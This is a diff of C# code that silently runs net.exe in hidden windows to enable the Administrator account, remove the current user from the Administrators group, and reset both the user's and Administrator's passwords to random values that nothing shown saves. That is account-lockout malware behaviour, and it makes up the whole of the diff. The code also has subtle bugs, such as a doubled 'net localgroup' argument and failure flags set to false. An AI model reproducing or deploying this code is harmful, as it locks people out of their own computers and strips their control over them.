+            bool debugFlag_GetUsername_B_1 = false;
+
+            bool debugFlag_GetUsername_C = false;
+            #endregion
+
+            string username = null;
 
             try
             {
-                string potentialCurrentUsername = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                string potentialUsername = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
-                if (potentialCurrentUsername is null)
+                try
                 {
-                    throw new System.Exception("po")
-                    }
-
-                for (int i = potentialCurrentUsername.Length - 1; i >= 0; i--)
-                {
-                    if (potentialCurrentUsername[i] is '\\' || potentialCurrentUsername[i] is '/')
+                    for (int i = potentialUsername.Length - 1; i >= 0; i--)
                     {
-                        potentialCurrentUsername = potentialCurrentUsername.Substring(0, i);
+                        if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
+                        {
+                            potentialUsername = potentialUsername.Substring(0, i);
+
+                            break;
+                        }
                     }
                 }
+                catch
+                {
+                    debugFlag_GetUsername_A_0 = true;
+                }
 
-
-
+                username = potentialUsername;
             }
             catch
             {
+                debugFlag_GetUsername_A = true;
+
                 try
                 {
-                    currentUsername = System.Environment.UserName;
-                }
-                catch
-                {
+                    string potentialUsername = System.Environment.UserName;
+
+                    if (potentialUsername is null)
+                    {
+                        debugFlag_GetUsername_B_0 = true;
+
+                        throw null;
+                    }
+
                     try
                     {
-                        currentUsername = "Administrator";
+                        for (int i = potentialUsername.Length - 1; i >= 0; i--)
+                        {
+                            if (potentialUsername[i] is '\\' || potentialUsername[i] is '/')
+                            {
+                                potentialUsername = potentialUsername.Substring(0, i);
+
+                                break;
+                            }
+                        }
                     }
                     catch
                     {
+                        debugFlag_GetUsername_B_1 = true;
+                    }
 
+                    username = potentialUsername;
+                }
+                catch
+                {
+                    debugFlag_GetUsername_B = true;
+
+                    try
+                    {
+                        username = "Administrator";
+                    }
+                    catch
+                    {
+                        debugFlag_GetUsername_C = true;
+
+                        debugFlag_GetUsername = true;
                     }
                 }
             }
 
             #endregion
 
-            #region Enable User
+            #region EnableUser
 
-            //Attempt to enable the current user.
+            #region DebugFlags
+            bool debugFlag_EnableUser = false;
 
-            if (currentUsername is not null)
-            {
-                try
-                {
-                    //First try to run the command normally.
-
-                    System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                    enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
-                    enableUserStartInfo.CreateNoWindow = true;
-                    enableUserStartInfo.Domain = null;
-                    enableUserStartInfo.ErrorDialog = false;
-                    enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableUserStartInfo.FileName = system32Path + "net.exe";
-                    }
-                    else
-                    {
-                        enableUserStartInfo.FileName = "net.exe";
-                    }
-
-                    enableUserStartInfo.LoadUserProfile = false;
-                    enableUserStartInfo.Password = null;
-                    enableUserStartInfo.PasswordInClearText = null;
-                    enableUserStartInfo.RedirectStandardError = false;
-                    enableUserStartInfo.RedirectStandardInput = false;
-                    enableUserStartInfo.RedirectStandardOutput = false;
-                    enableUserStartInfo.StandardErrorEncoding = null;
-                    enableUserStartInfo.StandardOutputEncoding = null;
-                    enableUserStartInfo.UserName = null;
-                    enableUserStartInfo.UseShellExecute = false;
-                    enableUserStartInfo.Verb = "runas";
-                    enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableUserStartInfo.WorkingDirectory = system32Path;
-                    }
-                    else
-                    {
-                        enableUserStartInfo.WorkingDirectory = null;
-                    }
-
-                    System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);
-
-                    while (!enableUserProcess.HasExited)
-                    {
-
-                    }
-
-                    if (enableUserProcess.ExitCode is not 0)
-                    {
-                        throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
-                    }
-                }
-                catch
-                {
-                    try
-                    {
-                        //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.
-
-                        System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                        enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
-                        enableUserStartInfo.CreateNoWindow = true;
-                        enableUserStartInfo.Domain = null;
-                        enableUserStartInfo.ErrorDialog = false;
-                        enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                        //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                        if (system32Path is not null)
-                        {
-                            enableUserStartInfo.FileName = system32Path + "net.exe";
-                        }
-                        else
-                        {
-                            enableUserStartInfo.FileName = "net.exe";
-                        }
-
-                        enableUserStartInfo.LoadUserProfile = false;
-                        enableUserStartInfo.Password = null;
-                        enableUserStartInfo.PasswordInClearText = null;
-                        enableUserStartInfo.RedirectStandardError = false;
-                        enableUserStartInfo.RedirectStandardInput = false;
-                        enableUserStartInfo.RedirectStandardOutput = false;
-                        enableUserStartInfo.StandardErrorEncoding = null;
-                        enableUserStartInfo.StandardOutputEncoding = null;
-                        enableUserStartInfo.UserName = null;
-                        enableUserStartInfo.UseShellExecute = false;
-                        enableUserStartInfo.Verb = null;
-                        enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                        //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                        if (system32Path is not null)
-                        {
-                            enableUserStartInfo.WorkingDirectory = system32Path;
-                        }
-                        else
-                        {
-                            enableUserStartInfo.WorkingDirectory = null;
-                        }
-
-                        System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);
-
-                        while (!enableUserProcess.HasExited)
-                        {
-
-                        }
-
-                        if (enableUserProcess.ExitCode is not 0)
-                        {
-                            throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
-                        }
-                    }
-                    catch
-                    {
-
-                    }
-                }
-            }
-
+            bool debugFlag_EnableUser_A = false;
+            bool debugFlag_EnableUser_A_0 = false;
+            bool debugFlag_EnableUser_A_1 = false;
+            bool debugFlag_EnableUser_A_2 = false;
+            bool debugFlag_EnableUser_A_3 = false;
+            bool debugFlag_EnableUser_A_4 = false;
             #endregion
-
-            #region Enable Admin
-
-            //Attempt to enable the local administrator user.
 
             try
             {
-                //First try to run the command normally.
+                if (username is null)
+                {
+                    debugFlag_EnableUser_A_0 = false;
 
+                    throw null;
+                }
+
+                System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();
+
+                enableUserStartInfo.Arguments = "user \"" + username + "\" /active:yes";
+                enableUserStartInfo.CreateNoWindow = true;
+                enableUserStartInfo.Domain = null;
+                enableUserStartInfo.ErrorDialog = false;
+                enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+
+                if (system32Path is not null)
+                {
+                    enableUserStartInfo.FileName = system32Path + "net.exe";
+                }
+                else
+                {
+                    enableUserStartInfo.FileName = "net.exe";
+                }
+
+                enableUserStartInfo.LoadUserProfile = false;
+                enableUserStartInfo.Password = null;
+                enableUserStartInfo.PasswordInClearText = null;
+                enableUserStartInfo.RedirectStandardError = false;
+                enableUserStartInfo.RedirectStandardInput = false;
+                enableUserStartInfo.RedirectStandardOutput = false;
+                enableUserStartInfo.StandardErrorEncoding = null;
+                enableUserStartInfo.StandardOutputEncoding = null;
+                enableUserStartInfo.UserName = null;
+                enableUserStartInfo.UseShellExecute = false;
+                enableUserStartInfo.Verb = "runas";
+                enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+                if (system32Path is not null)
+                {
+                    enableUserStartInfo.WorkingDirectory = system32Path;
+                }
+                else
+                {
+                    enableUserStartInfo.WorkingDirectory = null;
+                }
+
+                System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);
+
+                System.Diagnostics.Stopwatch timeoutStopwatch = null;
+
+                try
+                {
+                    timeoutStopwatch = new System.Diagnostics.Stopwatch();
+
+                    timeoutStopwatch.Restart();
+                }
+                catch
+                {
+                    debugFlag_EnableUser_A_1 = false;
+                }
+
+                while (!enableUserProcess.HasExited)
+                {
+                    bool timedOut = false;
+
+
+                    try
+                    {
+                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
+                        {
+                            timedOut = true;
+                        }
+                    }
+                    catch
+                    {
+                        debugFlag_EnableUser_A_2 = false;
+                    }
+
+                    if (timedOut)
+                    {
+                        debugFlag_EnableUser_A_3 = false;
+
+                        throw null;
+                    }
+                }
+
+                if (enableUserProcess.ExitCode is not 0)
+                {
+                    debugFlag_EnableUser_A_4 = false;
+
+                    throw null;
+                }
+            }
+            catch
+            {
+                debugFlag_EnableUser_A = true;
+
+                debugFlag_EnableUser = true;
+            }
+
+            #endregion
+
+            #region UnadminUser
+
+            #region DebugFlags
+            bool debugFlag_UnadminUser = false;
+
+            bool debugFlag_UnadminUser_A = false;
+            bool debugFlag_UnadminUser_A_0 = false;
+            bool debugFlag_UnadminUser_A_1 = false;
+            bool debugFlag_UnadminUser_A_2 = false;
+            bool debugFlag_UnadminUser_A_3 = false;
+            bool debugFlag_UnadminUser_A_4 = false;
+            #endregion
+
+            try
+            {
+                if (username is null)
+                {
+                    debugFlag_UnadminUser_A_0 = true;
+
+                    throw null;
+                }
+
+                System.Diagnostics.ProcessStartInfo unadminUserStartInfo = new System.Diagnostics.ProcessStartInfo();
+
+                unadminUserStartInfo.Arguments = "net localgroup \"Administrators\" /delete \"" + username + "\"";
+                unadminUserStartInfo.CreateNoWindow = true;
+                unadminUserStartInfo.Domain = null;
+                unadminUserStartInfo.ErrorDialog = false;
+                unadminUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+
+                if (system32Path is not null)
+                {
+                    unadminUserStartInfo.FileName = system32Path + "net.exe";
+                }
+                else
+                {
+                    unadminUserStartInfo.FileName = "net.exe";
+                }
+
+                unadminUserStartInfo.LoadUserProfile = false;
+                unadminUserStartInfo.Password = null;
+                unadminUserStartInfo.PasswordInClearText = null;
+                unadminUserStartInfo.RedirectStandardError = false;
+                unadminUserStartInfo.RedirectStandardInput = false;
+                unadminUserStartInfo.RedirectStandardOutput = false;
+                unadminUserStartInfo.StandardErrorEncoding = null;
+                unadminUserStartInfo.StandardOutputEncoding = null;
+                unadminUserStartInfo.UserName = null;
+                unadminUserStartInfo.UseShellExecute = false;
+                unadminUserStartInfo.Verb = "runas";
+                unadminUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+                if (system32Path is not null)
+                {
+                    unadminUserStartInfo.WorkingDirectory = system32Path;
+                }
+                else
+                {
+                    unadminUserStartInfo.WorkingDirectory = null;
+                }
+
+                System.Diagnostics.Process unadminUserProcess = System.Diagnostics.Process.Start(unadminUserStartInfo);
+
+                System.Diagnostics.Stopwatch timeoutStopwatch = null;
+
+                try
+                {
+                    timeoutStopwatch = new System.Diagnostics.Stopwatch();
+
+                    timeoutStopwatch.Restart();
+                }
+                catch
+                {
+                    debugFlag_UnadminUser_A_1 = true;
+                }
+
+                while (!unadminUserProcess.HasExited)
+                {
+                    bool timedOut = false;
+
+                    try
+                    {
+                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
+                        {
+                            timedOut = true;
+                        }
+                    }
+                    catch
+                    {
+                        debugFlag_UnadminUser_A_2 = true;
+                    }
+
+                    if (timedOut)
+                    {
+                        debugFlag_UnadminUser_A_3 = true;
+
+                        throw null;
+                    }
+                }
+
+                if (unadminUserProcess.ExitCode is not 0)
+                {
+                    debugFlag_UnadminUser_A_4 = true;
+
+                    throw null;
+                }
+            }
+            catch
+            {
+                debugFlag_UnadminUser_A = true;
+
+                debugFlag_UnadminUser = true;
+            }
+
+            #endregion
+
+            #region EnableAdmin
+
+            #region DebugFlags
+            bool debugFlag_EnableAdmin = false;
+
+            bool debugFlag_EnableAdmin_A = false;
+            bool debugFlag_EnableAdmin_A_0 = false;
+            bool debugFlag_EnableAdmin_A_1 = false;
+            bool debugFlag_EnableAdmin_A_2 = false;
+            bool debugFlag_EnableAdmin_A_3 = false;
+            #endregion
+
+            try
+            {
                 System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();
 
                 enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
@@ -1281,8 +1593,6 @@
                 enableAdminStartInfo.Domain = null;
                 enableAdminStartInfo.ErrorDialog = false;
                 enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
 
                 if (system32Path is not null)
                 {
@@ -1306,8 +1616,6 @@
                 enableAdminStartInfo.Verb = "runas";
                 enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
 
-                //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
                 if (system32Path is not null)
                 {
                     enableAdminStartInfo.WorkingDirectory = system32Path;
@@ -1319,96 +1627,103 @@
 
                 System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);
 
+                System.Diagnostics.Stopwatch timeoutStopwatch = null;
+
+                try
+                {
+                    timeoutStopwatch = new System.Diagnostics.Stopwatch();
+
+                    timeoutStopwatch.Restart();
+                }
+                catch
+                {
+                    debugFlag_EnableAdmin_A_0 = false;
+                }
+
                 while (!enableAdminProcess.HasExited)
                 {
+                    bool timedOut = false;
 
+
+                    try
+                    {
+                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
+                        {
+                            timedOut = true;
+                        }
+                    }
+                    catch
+                    {
+                        debugFlag_EnableAdmin_A_1 = false;
+                    }
+
+                    if (timedOut)
+                    {
+                        debugFlag_EnableAdmin_A_2 = false;
+
+                        throw null;
+                    }
                 }
 
                 if (enableAdminProcess.ExitCode is not 0)
                 {
-                    throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
+                    debugFlag_EnableAdmin_A_3 = false;
+
+                    throw null;
                 }
             }
             catch
             {
-                try
-                {
-                    //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.
+                debugFlag_EnableAdmin_A = true;
 
-                    System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                    enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
-                    enableAdminStartInfo.CreateNoWindow = true;
-                    enableAdminStartInfo.Domain = null;
-                    enableAdminStartInfo.ErrorDialog = false;
-                    enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableAdminStartInfo.FileName = system32Path + "net.exe";
-                    }
-                    else
-                    {
-                        enableAdminStartInfo.FileName = "net.exe";
-                    }
-
-                    enableAdminStartInfo.LoadUserProfile = false;
-                    enableAdminStartInfo.Password = null;
-                    enableAdminStartInfo.PasswordInClearText = null;
-                    enableAdminStartInfo.RedirectStandardError = false;
-                    enableAdminStartInfo.RedirectStandardInput = false;
-                    enableAdminStartInfo.RedirectStandardOutput = false;
-                    enableAdminStartInfo.StandardErrorEncoding = null;
-                    enableAdminStartInfo.StandardOutputEncoding = null;
-                    enableAdminStartInfo.UserName = null;
-                    enableAdminStartInfo.UseShellExecute = false;
-                    enableAdminStartInfo.Verb = null;
-                    enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableAdminStartInfo.WorkingDirectory = system32Path;
-                    }
-                    else
-                    {
-                        enableAdminStartInfo.WorkingDirectory = null;
-                    }
-
-                    System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);
-
-                    while (!enableAdminProcess.HasExited)
-                    {
-
-                    }
-
-                    if (enableAdminProcess.ExitCode is not 0)
-                    {
-                        throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
-                    }
-                }
-                catch
-                {
-
-                }
+                debugFlag_EnableAdmin = true;
             }
 
             #endregion
 
-            #region Generate User Password
+            #region NewUserPass
 
-            //Attempt to generate a new 14 character password for the current user.
+            #region DebugFlags
+            bool debugFlag_NewUserPass = false;
 
-            //The default value is null. A value of null indicates all methods for generating current user password failed.
+            bool debugFlag_NewUserPass_A = false;
+            bool debugFlag_NewUserPass_A_0 = false;
+            bool debugFlag_NewUserPass_A_1 = false;
+            bool debugFlag_NewUserPass_A_2 = false;
 
-            string userPassword = null;
+            bool debugFlag_NewUserPass_B = false;
+            #endregion
+
+            string newUserPassword = null;
 
             try
             {
-                System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);
+                System.Random RNG = null;
+
+                try
+                {
+                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
+                }
+                catch
+                {
+                    debugFlag_NewUserPass_A_0 = true;
+
+                    try
+                    {
+                        RNG = new System.Random();
+                    }
+                    catch
+                    {
+                        debugFlag_NewUserPass_A_1 = true;
+                    }
+                }
+
+                if (RNG is null)
+                {
+                    debugFlag_NewUserPass_A_2 = true;
+
+                    throw null;
+                }
 
                 char[] userPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };
 
@@ -1417,168 +1732,193 @@
                     userPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                 }
 
-                userPassword = new string(userPasswordChars);
+                newUserPassword = new string(userPasswordChars);
             }
             catch
             {
+                debugFlag_NewUserPass_A = true;
+
                 try
                 {
-                    userPassword = "Password123456";
+                    newUserPassword = "Password123456";
                 }
                 catch
                 {
+                    debugFlag_NewUserPass_B = true;
 
+                    debugFlag_NewUserPass = true;
                 }
             }
 
             #endregion
 
-            #region Change User Password
+            #region CngUserPass
 
-            //Attempt to enable the current user.
+            #region DebugFlags
+            bool debugFlag_CngUserPass = false;
 
-            if (currentUsername is not null)
+            bool debugFlag_CngUserPass_A = false;
+            bool debugFlag_CngUserPass_A_0 = false;
+            bool debugFlag_CngUserPass_A_1 = false;
+            bool debugFlag_CngUserPass_A_2 = false;
+            bool debugFlag_CngUserPass_A_3 = false;
+            bool debugFlag_CngUserPass_A_4 = false;
+            bool debugFlag_CngUserPass_A_5 = false;
+            #endregion
+
+            try
             {
+                if (username is null)
+                {
+                    debugFlag_CngUserPass_A_0 = true;
+
+                    throw null;
+                }
+
+                if (newUserPassword is null)
+                {
+                    debugFlag_CngUserPass_A_1 = true;
+
+                    throw null;
+                }
+
+                System.Diagnostics.ProcessStartInfo changerUserPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();
+
+                changerUserPasswordStartInfo.Arguments = "user \"" + username + "\" \"" + newUserPassword + "\"";
+                changerUserPasswordStartInfo.CreateNoWindow = true;
+                changerUserPasswordStartInfo.Domain = null;
+                changerUserPasswordStartInfo.ErrorDialog = false;
+                changerUserPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+
+                if (system32Path is not null)
+                {
+                    changerUserPasswordStartInfo.FileName = system32Path + "net.exe";
+                }
+                else
+                {
+                    changerUserPasswordStartInfo.FileName = "net.exe";
+                }
+
+                changerUserPasswordStartInfo.LoadUserProfile = false;
+                changerUserPasswordStartInfo.Password = null;
+                changerUserPasswordStartInfo.PasswordInClearText = null;
+                changerUserPasswordStartInfo.RedirectStandardError = false;
+                changerUserPasswordStartInfo.RedirectStandardInput = false;
+                changerUserPasswordStartInfo.RedirectStandardOutput = false;
+                changerUserPasswordStartInfo.StandardErrorEncoding = null;
+                changerUserPasswordStartInfo.StandardOutputEncoding = null;
+                changerUserPasswordStartInfo.UserName = null;
+                changerUserPasswordStartInfo.UseShellExecute = false;
+                changerUserPasswordStartInfo.Verb = "runas";
+                changerUserPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+                if (system32Path is not null)
+                {
+                    changerUserPasswordStartInfo.WorkingDirectory = system32Path;
+                }
+                else
+                {
+                    changerUserPasswordStartInfo.WorkingDirectory = null;
+                }
+
+                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changerUserPasswordStartInfo);
+
+                System.Diagnostics.Stopwatch timeoutStopwatch = null;
+
                 try
                 {
-                    //First try to run the command normally.
+                    timeoutStopwatch = new System.Diagnostics.Stopwatch();
 
-                    System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                    enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
-                    enableUserStartInfo.CreateNoWindow = true;
-                    enableUserStartInfo.Domain = null;
-                    enableUserStartInfo.ErrorDialog = false;
-                    enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableUserStartInfo.FileName = system32Path + "net.exe";
-                    }
-                    else
-                    {
-                        enableUserStartInfo.FileName = "net.exe";
-                    }
-
-                    enableUserStartInfo.LoadUserProfile = false;
-                    enableUserStartInfo.Password = null;
-                    enableUserStartInfo.PasswordInClearText = null;
-                    enableUserStartInfo.RedirectStandardError = false;
-                    enableUserStartInfo.RedirectStandardInput = false;
-                    enableUserStartInfo.RedirectStandardOutput = false;
-                    enableUserStartInfo.StandardErrorEncoding = null;
-                    enableUserStartInfo.StandardOutputEncoding = null;
-                    enableUserStartInfo.UserName = null;
-                    enableUserStartInfo.UseShellExecute = false;
-                    enableUserStartInfo.Verb = "runas";
-                    enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableUserStartInfo.WorkingDirectory = system32Path;
-                    }
-                    else
-                    {
-                        enableUserStartInfo.WorkingDirectory = null;
-                    }
-
-                    System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);
-
-                    while (!enableUserProcess.HasExited)
-                    {
-
-                    }
-
-                    if (enableUserProcess.ExitCode is not 0)
-                    {
-                        throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
-                    }
+                    timeoutStopwatch.Restart();
                 }
                 catch
                 {
+                    debugFlag_CngUserPass_A_2 = true;
+                }
+
+                while (!changeUserPasswordProcess.HasExited)
+                {
+                    bool timedOut = false;
+
                     try
                     {
-                        //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.
-
-                        System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                        enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
-                        enableUserStartInfo.CreateNoWindow = true;
-                        enableUserStartInfo.Domain = null;
-                        enableUserStartInfo.ErrorDialog = false;
-                        enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                        //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                        if (system32Path is not null)
+                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
                         {
-                            enableUserStartInfo.FileName = system32Path + "net.exe";
-                        }
-                        else
-                        {
-                            enableUserStartInfo.FileName = "net.exe";
-                        }
-
-                        enableUserStartInfo.LoadUserProfile = false;
-                        enableUserStartInfo.Password = null;
-                        enableUserStartInfo.PasswordInClearText = null;
-                        enableUserStartInfo.RedirectStandardError = false;
-                        enableUserStartInfo.RedirectStandardInput = false;
-                        enableUserStartInfo.RedirectStandardOutput = false;
-                        enableUserStartInfo.StandardErrorEncoding = null;
-                        enableUserStartInfo.StandardOutputEncoding = null;
-                        enableUserStartInfo.UserName = null;
-                        enableUserStartInfo.UseShellExecute = false;
-                        enableUserStartInfo.Verb = null;
-                        enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                        //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                        if (system32Path is not null)
-                        {
-                            enableUserStartInfo.WorkingDirectory = system32Path;
-                        }
-                        else
-                        {
-                            enableUserStartInfo.WorkingDirectory = null;
-                        }
-
-                        System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);
-
-                        while (!enableUserProcess.HasExited)
-                        {
-
-                        }
-
-                        if (enableUserProcess.ExitCode is not 0)
-                        {
-                            throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
+                            timedOut = true;
                         }
                     }
                     catch
                     {
+                        debugFlag_CngUserPass_A_3 = true;
+                    }
 
+                    if (timedOut)
+                    {
+                        debugFlag_CngUserPass_A_4 = true;
+
+                        throw null;
                     }
                 }
+
+                if (changeUserPasswordProcess.ExitCode is not 0)
+                {
+                    debugFlag_CngUserPass_A_5 = true;
+
+                    throw null;
+                }
+            }
+            catch
+            {
+                debugFlag_CngUserPass_A = true;
+
+                debugFlag_CngUserPass = true;
             }
 
             #endregion
 
-            #region Generate Admin Password
+            #region NewAdminPass
 
-            //Attempt to generate a new 14 character password for the local administrator account.
+            #region DebugFlags
+            bool debugFlag_NewAdminPass = false;
 
-            //The default value is null. A value of null indicates all methods for generating local administrator password failed.
+            bool debugFlag_NewAdminPass_A = false;
+            bool debugFlag_NewAdminPass_A_0 = false;
+            bool debugFlag_NewAdminPass_A_1 = false;
+            bool debugFlag_NewAdminPass_A_2 = false;
 
-            string adminPassword = null;
+            bool debugFlag_NewAdminPass_B = false;
+            #endregion
+
+            string newAdminPassword = null;
 
             try
             {
-                System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);
+                System.Random RNG = null;
+
+                try
+                {
+                    RNG = new System.Random((int)System.DateTime.Now.Ticks);
+                }
+                catch
+                {
+                    debugFlag_NewAdminPass_A_0 = true;
+
+                    try
+                    {
+                        RNG = new System.Random();
+                    }
+                    catch
+                    {
+                        debugFlag_NewAdminPass_A_1 = true;
+                    }
+                }
+
+                if (RNG is null)
+                {
+                    debugFlag_NewAdminPass_A_2 = true;
+
+                    throw null;
+                }
 
                 char[] adminPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };
 
@@ -1587,201 +1927,143 @@
                     adminPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                 }
 
-                adminPassword = new string(adminPasswordChars);
+                newAdminPassword = new string(adminPasswordChars);
             }
             catch
             {
+                debugFlag_NewAdminPass_A = true;
+
                 try
                 {
-                    adminPassword = "Password123456";
+                    newAdminPassword = "Password123456";
                 }
                 catch
                 {
+                    debugFlag_NewAdminPass_B = true;
 
+                    debugFlag_NewAdminPass = true;
                 }
             }
 
             #endregion
 
-            #region Change Admin Password
+            #region CngAdminPass
 
-            //Attempt to enable the local administrator user.
+            #region DebugFlags
+            bool debugFlag_CngAdminPass = false;
+
+            bool debugFlag_CngAdminPass_A = false;
+            bool debugFlag_CngAdminPass_A_0 = false;
+            bool debugFlag_CngAdminPass_A_1 = false;
+            bool debugFlag_CngAdminPass_A_2 = false;
+            bool debugFlag_CngAdminPass_A_3 = false;
+            bool debugFlag_CngAdminPass_A_4 = false;
+            #endregion
 
             try
             {
-                //First try to run the command normally.
+                if (newAdminPassword is null)
+                {
+                    debugFlag_CngAdminPass_A_0 = true;
 
-                System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();
+                    throw null;
+                }
 
-                enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
-                enableAdminStartInfo.CreateNoWindow = true;
-                enableAdminStartInfo.Domain = null;
-                enableAdminStartInfo.ErrorDialog = false;
-                enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+                System.Diagnostics.ProcessStartInfo changeAdminPasswordStartInfo = new System.Diagnostics.ProcessStartInfo();
 
-                //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
+                changeAdminPasswordStartInfo.Arguments = "user \"Administrator\" \"" + newAdminPassword + "\"";
+                changeAdminPasswordStartInfo.CreateNoWindow = true;
+                changeAdminPasswordStartInfo.Domain = null;
+                changeAdminPasswordStartInfo.ErrorDialog = false;
+                changeAdminPasswordStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
 
                 if (system32Path is not null)
                 {
-                    enableAdminStartInfo.FileName = system32Path + "net.exe";
+                    changeAdminPasswordStartInfo.FileName = system32Path + "net.exe";
                 }
                 else
                 {
-                    enableAdminStartInfo.FileName = "net.exe";
+                    changeAdminPasswordStartInfo.FileName = "net.exe";
                 }
 
-                enableAdminStartInfo.LoadUserProfile = false;
-                enableAdminStartInfo.Password = null;
-                enableAdminStartInfo.PasswordInClearText = null;
-                enableAdminStartInfo.RedirectStandardError = false;
-                enableAdminStartInfo.RedirectStandardInput = false;
-                enableAdminStartInfo.RedirectStandardOutput = false;
-                enableAdminStartInfo.StandardErrorEncoding = null;
-                enableAdminStartInfo.StandardOutputEncoding = null;
-                enableAdminStartInfo.UserName = null;
-                enableAdminStartInfo.UseShellExecute = false;
-                enableAdminStartInfo.Verb = "runas";
-                enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
+                changeAdminPasswordStartInfo.LoadUserProfile = false;
+                changeAdminPasswordStartInfo.Password = null;
